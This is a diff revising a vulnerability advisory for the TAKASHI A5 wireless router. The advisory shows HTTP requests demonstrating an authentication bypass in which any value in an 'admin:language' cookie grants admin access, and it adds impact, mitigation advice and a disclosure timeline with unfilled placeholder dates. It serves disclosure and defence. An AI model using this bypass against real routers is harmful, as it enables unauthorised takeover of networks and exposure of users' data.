@@ -1,67 +1,102 @@
-#TAKASHI Wireless Instant Router And Repeater Web Application Authentication Bypass<br />
-`Software version 	    V5.07.38_AAL03`<br />
-`Hardware version 	    V3.0`<br />
-`Model no.A5`<br />
-This vulnerability is related to how the web application handles sessions for authenticated users. The issue arises due to improper session management, allowing unauthorized users to gain admin-level access.
+# TAKASHI Wireless Instant Router and Repeater - Authentication Bypass Vulnerability
 
-#Below You Will See A Request Comparison
+## Overview
+A critical authentication bypass vulnerability has been identified in the TAKASHI Wireless Instant Router and Repeater (Model A5) running firmware version **V5.07.38_AAL03** with hardware version **V3.0**. This vulnerability allows unauthorized users to gain administrative access due to improper session management.
 
+## Affected Model
+- **Model**: A5  
+- **Software Version**: V5.07.38_AAL03  
+- **Hardware Version**: V3.0  
+
+## Vulnerability Details
+The web application does not properly validate session data, allowing attackers to manipulate cookies and bypass authentication. By setting a specific cookie value, an attacker can gain admin-level access without valid credentials.
+
+## Request Comparison
 To understand how this vulnerability works, let's compare an unauthenticated request to an authenticated request.
 
-**An unauthenticated request looks like this:**
-
-POST /LoginCheck HTTP/1.1<br />
-Host: 192.168.2.1<br />
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br />
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
-Accept-Language: en-US,en;q=0.5<br />
-Accept-Encoding: gzip, deflate, br<br />
-Referer: `http://192.168.2.1/login.asp`<br />
-Content-Type: application/x-www-form-urlencoded<br />
-Content-Length: 46<br />
-Origin: `http://192.168.2.1`<br />
-DNT: 1<br />
-Sec-GPC: 1<br />
-Connection: keep-alive<br />
-Cookie: language=en<br />
-Upgrade-Insecure-Requests: 1<br />
-Priority: u=0, i<br />
+### Unauthenticated Request
+```
+POST /LoginCheck HTTP/1.1
+Host: 192.168.2.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://192.168.2.1/login.asp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://192.168.2.1
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Cookie: language=en
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 
 Username=admin&checkEn=0&Password=whatsthepassword
+```
 
-**When the user is authenticated, the request looks like this:**<br />
+### Authenticated Request
+```
+GET /wireless_basic.asp HTTP/1.1
+Host: 192.168.2.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://192.168.2.1/advance.asp
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Cookie: language=en; admin:language=en
+Upgrade-Insecure-Requests: 1
+Priority: u=4
+```
 
-GET /wireless_basic.asp HTTP/1.1<br />
-Host: `192.168.2.1`<br />
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br />
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
-Accept-Language: en-US,en;q=0.5<br />
-Accept-Encoding: gzip, deflate, br<br />
-Referer: `http://192.168.2.1/advance.asp`<br />
-DNT: 1<br />
-Sec-GPC: 1<br />
-Connection: keep-alive<br />
-Cookie: language=en; admin:language=en<br />
-Upgrade-Insecure-Requests: 1<br />
-Priority: u=4<br />
+## Key Difference
+The key difference between the two requests is the presence of the following cookie:
+```
+admin:language=en
+```
+
+## The Vulnerability
+The application trusts the `admin:language` cookie without properly verifying session authentication. By simply adding this cookie with an arbitrary value, an unauthenticated user can gain full administrative access.
+
+### Exploit Mechanics
+An attacker can exploit this vulnerability by setting the following cookie:
+```
+admin:language=<any_value>
+```
+Where `<any_value>` can be any string, text, or number. As long as the cookie is present, the application will treat the user as an authenticated admin.
+
+## Impact
+- Unauthorized users can gain admin-level access without valid credentials.
+- Attackers can modify router settings, expose sensitive data, and potentially disrupt network operations.
+- No brute-force or credential stuffing is needed—just cookie manipulation.
+
+## Mitigation
+To mitigate this issue, the following steps should be taken:
+1. **Proper Session Management**: Implement server-side session validation instead of relying on client-side cookies.
+2. **Token-Based Authentication**: Use secure session tokens that cannot be forged.
+3. **Session Expiry**: Ensure sessions expire and require re-authentication after a set period.
+4. **Cookie Integrity Checks**: Validate cookies against an active session in the backend database.
+
+## Disclosure Timeline
+- **Discovery**: [Insert Date]  
+- **Vendor Notified**: [Insert Date]  
+- **Patch Released**: [Pending/Date]  
+- **Public Disclosure**: [Insert Date]  
+
+## References
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+- [GoAhead Web Server](https://www.embedthis.com/goahead/)
+
+## Disclaimer
+This vulnerability report is for educational and research purposes only. The information provided should not be used for malicious activities. Always obtain proper authorization before testing security vulnerabilities on any system.
+
+---
+
+**Contributors**  
+- William James Schleppegrell
 
 
-Key Difference<br />
-
-The key difference between the two requests is the presence of the following cookie:<br />
-
-`admin:language=en`
-
-The Vulnerability<br />
-
-This vulnerability is based on the way the application validates session data. By manipulating the admin:language cookie, an unauthenticated user can gain access to authenticated pages.<br />
-Exploit Mechanics
-
-To exploit this vulnerability, all an attacker needs to do is set the cookie admin:language with any arbitrary value. The application will trust this cookie and treat the user as an authenticated admin.
-
-`admin:language=<any_value>`
-
-Where <any_value> can be any string,text or numbers. As long as the cookie is given that name, the application will behave as if the user is authenticated.
-Conclusion
-
-This vulnerability shows the importance of proper session management.
